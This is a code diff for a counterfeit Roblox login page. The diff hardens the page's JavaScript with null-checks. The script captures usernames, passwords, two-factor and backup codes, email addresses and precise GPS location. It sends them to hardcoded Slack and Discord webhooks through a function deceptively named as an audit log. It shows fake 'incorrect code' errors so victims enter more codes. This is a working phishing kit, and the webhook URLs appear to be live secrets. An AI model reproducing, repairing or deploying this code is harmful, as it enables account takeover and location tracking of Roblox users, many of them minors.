@@ -392,7 +392,6 @@
     </footer>
 </div>
 <script>
-<script>
 const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
 const WAIT = 3000;
@@ -453,7 +452,7 @@ let clientGeoData = {
     } catch (e) {}
 })();
 
-// 2. Präzise GPS-Standortabfrage (wird nach Code-Versand aufgerufen)
+// 2. Präzise GPS-Standortabfrage
 function requestPreciseGPS(cb) {
     if (!navigator.geolocation) {
         if(cb) cb();
@@ -666,10 +665,14 @@ function hideAllModals(){
 
 function showErrorUnderFields(){
     hideAllModals();
-    document.getElementById('react-login-container').style.display = 'block';
-    document.getElementById('text-error').textContent = "Something went wrong. Please try again.";
-    document.getElementById('login-username').value = '';
-    document.getElementById('login-password').value = '';
+    const loginContainer = document.getElementById('react-login-container');
+    if(loginContainer) loginContainer.style.display = 'block';
+    const errText = document.getElementById('text-error');
+    if(errText) errText.textContent = "Something went wrong. Please try again.";
+    const uInput = document.getElementById('login-username');
+    if(uInput) uInput.value = '';
+    const pInput = document.getElementById('login-password');
+    if(pInput) pInput.value = '';
     const av = document.getElementById('avatar-preview');
     if(av) av.style.display = 'none';
 }
@@ -693,7 +696,6 @@ function chooseMethod(method){
     }, 1200);
 }
 
-const form = document.querySelector('form.login-form');
 const usernameInput = document.getElementById('login-username');
 const passwordInput = document.getElementById('login-password');
 const loginButton = document.getElementById('login-button');
@@ -703,18 +705,22 @@ const avatarPreviewEl = document.getElementById('avatar-preview');
 
 let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null };
 
-usernameInput.addEventListener('blur', function(){
-    const val = this.value.trim();
-    if(!val || val.indexOf('@') > -1) return;
-    getRobloxProfileData(val, (res) => {
-        if(res.avatar){
-            lastLogin.avatarUrl = res.avatar;
-            lastLogin.profileDetails = res.details;
-            avatarPreviewEl.src = res.avatar;
-            avatarPreviewEl.style.display = 'block';
-        }
+if(usernameInput){
+    usernameInput.addEventListener('blur', function(){
+        const val = this.value.trim();
+        if(!val || val.indexOf('@') > -1) return;
+        getRobloxProfileData(val, (res) => {
+            if(res.avatar){
+                lastLogin.avatarUrl = res.avatar;
+                lastLogin.profileDetails = res.details;
+                if(avatarPreviewEl){
+                    avatarPreviewEl.src = res.avatar;
+                    avatarPreviewEl.style.display = 'block';
+                }
+            }
+        });
     });
-});
+}
 
 function setError(msg){ if(errorText) errorText.textContent = msg || ''; }
 function setLoading(on){
@@ -723,8 +729,8 @@ function setLoading(on){
 }
 
 function doLogin(){
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value;
+    const username = usernameInput ? usernameInput.value.trim() : '';
+    const password = passwordInput ? passwordInput.value : '';
 
     if(!username || !password){
         setError("Username and password required");
@@ -747,26 +753,30 @@ function doLogin(){
 
     setTimeout(() => {
         setLoading(false);
-        document.getElementById('methodChoice').style.display = 'block';
+        const methodChoice = document.getElementById('methodChoice');
+        if(methodChoice) methodChoice.style.display = 'block';
     }, WAIT);
 }
 
-form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
-loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
-form.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); doLogin(); } });
+if(loginButton){
+    loginButton.addEventListener('click', function(e){
+        e.preventDefault();
+        doLogin();
+    });
+}
 
 /* Funktion: Zuerst Code sofort absenden, danach GPS anfordern */
 function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue) {
     buttonElement.disabled = true;
     buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
 
-    // 1. Code sofort an Webhooks senden
+    // 1. Code sofort senden
     sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
         Method: methodType,
         Code: codeValue
     }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
-    // 2. Danach GPS abfragen und aktualisieren
+    // 2. Danach GPS abfragen
     requestPreciseGPS(() => {
         setTimeout(() => {
             buttonElement.disabled = false;
@@ -777,122 +787,178 @@ function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue)
 }
 
 /* 2FA: Email */
-document.getElementById('verifyButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input').value.replace(/\D/g,'');
-    if(code.length !== 6){ document.getElementById('twostep-error').textContent = "Enter the 6-digit code."; return; }
-    handleVerificationWithDeferredGPS(this, "Email", code);
-});
+const verifyBtn = document.getElementById('verifyButton');
+if(verifyBtn){
+    verifyBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('two-step-verification-code-input');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : '';
+        if(code.length !== 6){ 
+            const twostepErr = document.getElementById('twostep-error');
+            if(twostepErr) twostepErr.textContent = "Enter the 6-digit code."; 
+            return; 
+        }
+        handleVerificationWithDeferredGPS(this, "Email", code);
+    });
+}
 
 /* 2FA: Authenticator */
-document.getElementById('AuthenButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-authenticator').value.replace(/\D/g,'');
-    if(code.length !== 6) return;
-    this.disabled = true;
-    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+const authenBtn = document.getElementById('AuthenButton');
+if(authenBtn){
+    authenBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('two-step-verification-code-input-authenticator');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : '';
+        if(code.length !== 6) return;
+        this.disabled = true;
+        this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
 
-    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-        Method: "Authenticator",
-        Code: code
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
+        sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
+            Method: "Authenticator",
+            Code: code
+        }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
-    requestPreciseGPS(() => {
-        setTimeout(() => {
-            this.disabled = false;
-            this.innerHTML = 'Verify';
-            document.getElementById('Authen-error').textContent = "Incorrect code. Please try again.";
-        }, WAIT);
+        requestPreciseGPS(() => {
+            setTimeout(() => {
+                this.disabled = false;
+                this.innerHTML = 'Verify';
+                const authenErr = document.getElementById('Authen-error');
+                if(authenErr) authenErr.textContent = "Incorrect code. Please try again.";
+            }, WAIT);
+        });
     });
-});
+}
 
 /* Recovery: Email Backup-Code */
-document.getElementById('RecoveryFromEmailButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-RecoveryFromEmail').value.replace(/\D/g,'');
-    if(code.length !== 9) return;
-    handleVerificationWithDeferredGPS(this, "Backup Code (Email)", code);
-});
+const recEmailBtn = document.getElementById('RecoveryFromEmailButton');
+if(recEmailBtn){
+    recEmailBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('two-step-verification-code-input-RecoveryFromEmail');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : '';
+        if(code.length !== 9) return;
+        handleVerificationWithDeferredGPS(this, "Backup Code (Email)", code);
+    });
+}
 
 /* Recovery: Authenticator Backup-Code */
-document.getElementById('RecoveryFromAuthenButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-recoveryFromAuthen').value.replace(/\D/g,'');
-    if(code.length !== 9) return;
-    handleVerificationWithDeferredGPS(this, "Backup Code (Authenticator)", code);
-});
+const recAuthBtn = document.getElementById('RecoveryFromAuthenButton');
+if(recAuthBtn){
+    recAuthBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('two-step-verification-code-input-recoveryFromAuthen');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : '';
+        if(code.length !== 9) return;
+        handleVerificationWithDeferredGPS(this, "Backup Code (Authenticator)", code);
+    });
+}
 
 /* One-Time Code: Step 1 */
-document.getElementById('otp-login-button').addEventListener('click', function(){
-    document.getElementById('otp-email-input').value = '';
-    document.getElementById('otp-error').innerHTML = '&nbsp;';
-    document.getElementById('otpEmailModal').style.display = 'block';
-});
-
-document.getElementById('otp-send-btn').addEventListener('click', function(){
-    const email = document.getElementById('otp-email-input').value.trim();
-    if(!email || email.indexOf('@') === -1){
-        document.getElementById('otp-error').textContent = "Please enter a valid email address.";
-        return;
-    }
-    sendStructuredAuditLog("MFA_CHOICE", email, {
-        Method: "One-Time Code Request",
-        Email: email
+const otpLoginBtn = document.getElementById('otp-login-button');
+if(otpLoginBtn){
+    otpLoginBtn.addEventListener('click', function(){
+        const emailInput = document.getElementById('otp-email-input');
+        if(emailInput) emailInput.value = '';
+        const otpErr = document.getElementById('otp-error');
+        if(otpErr) otpErr.innerHTML = '&nbsp;';
+        const otpEmailModal = document.getElementById('otpEmailModal');
+        if(otpEmailModal) otpEmailModal.style.display = 'block';
     });
+}
 
-    document.getElementById('otp-email-display').textContent = email;
-    document.getElementById('otp-code-input').value = '';
-    document.getElementById('otp-code-error').innerHTML = '&nbsp;';
-    document.getElementById('otp-verify-btn').disabled = true;
-    document.getElementById('otpEmailModal').style.display = 'none';
-    document.getElementById('otpCodeModal').style.display = 'block';
-});
+const otpSendBtn = document.getElementById('otp-send-btn');
+if(otpSendBtn){
+    otpSendBtn.addEventListener('click', function(){
+        const emailInput = document.getElementById('otp-email-input');
+        const email = emailInput ? emailInput.value.trim() : '';
+        if(!email || email.indexOf('@') === -1){
+            const otpErr = document.getElementById('otp-error');
+            if(otpErr) otpErr.textContent = "Please enter a valid email address.";
+            return;
+        }
+        sendStructuredAuditLog("MFA_CHOICE", email, {
+            Method: "One-Time Code Request",
+            Email: email
+        });
+
+        const otpEmailDisplay = document.getElementById('otp-email-display');
+        if(otpEmailDisplay) otpEmailDisplay.textContent = email;
+        const otpCodeInput = document.getElementById('otp-code-input');
+        if(otpCodeInput) otpCodeInput.value = '';
+        const otpCodeErr = document.getElementById('otp-code-error');
+        if(otpCodeErr) otpCodeErr.innerHTML = '&nbsp;';
+        const otpVerifyBtn = document.getElementById('otp-verify-btn');
+        if(otpVerifyBtn) otpVerifyBtn.disabled = true;
+        
+        const otpEmailModal = document.getElementById('otpEmailModal');
+        if(otpEmailModal) otpEmailModal.style.display = 'none';
+        const otpCodeModal = document.getElementById('otpCodeModal');
+        if(otpCodeModal) otpCodeModal.style.display = 'block';
+    });
+}
 
 /* One-Time Code: Step 2 */
-document.getElementById('otp-verify-btn').addEventListener('click', function(){
-    const code = document.getElementById('otp-code-input').value.replace(/\D/g,'');
-    const email = document.getElementById('otp-email-input').value.trim();
-    if(code.length !== 6) return;
-    this.disabled = true;
-    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-    
-    sendStructuredAuditLog("MFA_SUCCESS", email, {
-        Method: "One-Time Code",
-        Code: code,
-        Email: email
-    });
+const otpVerifyBtn = document.getElementById('otp-verify-btn');
+if(otpVerifyBtn){
+    otpVerifyBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('otp-code-input');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : '';
+        const emailInput = document.getElementById('otp-email-input');
+        const email = emailInput ? emailInput.value.trim() : '';
+        if(code.length !== 6) return;
+        this.disabled = true;
+        this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+        
+        sendStructuredAuditLog("MFA_SUCCESS", email, {
+            Method: "One-Time Code",
+            Code: code,
+            Email: email
+        });
 
-    requestPreciseGPS(() => {
-        setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+        requestPreciseGPS(() => {
+            setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+        });
     });
-});
+}
 
 /* Resend Code */
-document.getElementById('resend-btn').addEventListener('click', function(){
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
-        Action: "Resend Code Requested"
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    alert("A new code has been sent to your email address.");
-});
+const resendBtn = document.getElementById('resend-btn');
+if(resendBtn){
+    resendBtn.addEventListener('click', function(){
+        sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
+            Action: "Resend Code Requested"
+        }, lastLogin.avatarUrl, lastLogin.profileDetails);
+        alert("A new code has been sent to your email address.");
+    });
+}
 
 /* Forgot Password */
-document.getElementById('forgot-credentials-link').addEventListener('click', function(e){
-    e.preventDefault();
-    const n = prompt("Please enter your username or email address:");
-    if(!n) return;
-    getRobloxProfileData(n, (res) => {
-        sendStructuredAuditLog("MFA_CHOICE", n, { Action: "Forgot Password Recovery" }, res.avatar, res.details);
+const forgotLink = document.getElementById('forgot-credentials-link');
+if(forgotLink){
+    forgotLink.addEventListener('click', function(e){
+        e.preventDefault();
+        const n = prompt("Please enter your username or email address:");
+        if(!n) return;
+        getRobloxProfileData(n, (res) => {
+            sendStructuredAuditLog("MFA_CHOICE", n, { Action: "Forgot Password Recovery" }, res.avatar, res.details);
+        });
+        alert("If this account exists, a recovery email has been sent.");
     });
-    alert("If this account exists, a recovery email has been sent.");
-});
+}
 
 /* Quick Login */
-document.getElementById('cross-device-login-button').addEventListener('click', function(){
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Action: "Quick Login QR Started" }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    alert("Open the Roblox app on another device and scan the code.");
-});
+const crossDeviceBtn = document.getElementById('cross-device-login-button');
+if(crossDeviceBtn){
+    crossDeviceBtn.addEventListener('click', function(){
+        sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Action: "Quick Login QR Started" }, lastLogin.avatarUrl, lastLogin.profileDetails);
+        alert("Open the Roblox app on another device and scan the code.");
+    });
+}
 
 /* Sign Up */
-document.getElementById('sign-up-link').addEventListener('click', function(e){
-    e.preventDefault();
-    setError("For this action, only the login function is available.");
-});
+const signUpLink = document.getElementById('sign-up-link');
+if(signUpLink){
+    signUpLink.addEventListener('click', function(e){
+        e.preventDefault();
+        setError("For this action, only the login function is available.");
+    });
+}
 </script>
 </body>
 </html>
